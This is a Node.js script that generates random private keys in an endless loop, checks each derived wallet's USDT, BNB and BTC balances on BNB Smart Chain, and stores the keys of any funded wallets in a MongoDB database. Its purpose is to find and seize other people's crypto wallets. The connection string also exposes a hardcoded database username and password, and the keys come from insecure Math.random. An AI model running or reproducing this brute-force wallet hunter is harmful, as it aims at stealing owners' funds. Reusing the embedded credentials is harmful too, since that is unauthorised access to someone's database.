const Web3 = require('web3');
const { USDT, BNB, BTC } = require('./token');
const web3 = new Web3('https://bsc-dataseed.bnbchain.org')
const mongoose = require('mongoose');

// ---------------------------------------------------model
const options = {     
    useNewUrlParser: true,
    useUnifiedTopology: true,
};

const webDB = mongoose.createConnection("mongodb+srv://louis1258:nghiahothanh319@cluster0.2xxsgb1.mongodb.net/", options);

// Lắng nghe sự kiện kết nối thành công
webDB.on("connected", () => {
    console.log("✅ Connect DB successfully");
});

webDB.on("error", (error) => {
    console.error("❌ Error connecting to MongoDB:", error);
});

const addressSchema = new mongoose.Schema(
    {
        privateKey: { type: String, required: true },
        address: { type: String, required: true, },
    },
    { timestamps: true }
);

// Tạo model
const WalletModel = webDB.model("Wallet", addressSchema);
// ---------------------------------------------------sleep


function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
// --------------------------------------------------- key

function generateRandomPK() {
    const hexChars = "0123456789abcdef";
    let result = "";
    for (let i = 0; i < 64; i++) {
      result += hexChars[Math.floor(Math.random() * 16)];
    }
    return result;
  }

// --------------------------------------------------- run
  const genWallet = async ()=>{
    const contractUSDT = new web3.eth.Contract(USDT.abi,USDT.address)
    const contractBTC = new web3.eth.Contract(BTC.abi,BTC.address)
    while (true) {
        const code = generateRandomPK()
        const wallet  = await web3.eth.accounts.privateKeyToAccount(code);
        // const wallet = {address:"0x243dd9F06B21b526e891C7F7cb304Fdf5341908b"}
        const balanceUSDT = await contractUSDT.methods.balanceOf(wallet.address).call()
        const balanceWei = await web3.eth.getBalance(wallet.address)
        const balanceBNB = web3.utils.fromWei(balanceWei, "ether");
        const balanceBTC = await contractBTC.methods.balanceOf(wallet.address).call()
        console.log(balanceUSDT,balanceBNB,balanceBTC)
        if(balanceUSDT != 0 ||balanceBNB != 0 || balanceBTC != 0)
        {
            await WalletModel.create({privateKey:code, address:wallet.address})
        }
        await sleep(100)
        console.log("wallet.address ", wallet.address)
    }

  }
  genWallet()